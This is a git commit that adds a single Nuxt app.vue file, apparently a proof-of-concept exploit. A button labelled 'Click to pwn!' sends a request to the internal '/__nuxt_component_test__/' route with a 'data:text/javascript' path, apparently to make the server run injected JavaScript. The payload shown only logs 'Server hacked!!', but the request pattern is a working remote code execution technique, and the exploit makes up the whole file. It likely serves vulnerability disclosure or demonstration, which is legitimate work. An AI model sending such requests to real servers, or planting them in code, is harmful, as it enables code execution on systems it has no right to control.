c347d80be28db2c454f801ec5b37d1ca6f2f6b26
domdomi3 <72478812+domdomi3@users.noreply.github.com>
2023-11-08 15:15:07 +0900

    Initial commit

---
+++ app.vue
@@ -0,0 +1,13 @@
+<template>
+  <div>
+    <button @click="pwn">Click to pwn!</button>
+  </div>
+</template>
+
+<script setup lang="ts">
+const pwn = async () => {
+  const res = await useFetch(
+    '/__nuxt_component_test__/?path=data:text/javascript,console.log("[!] Server hacked!!");'
+  );
+};
+</script>
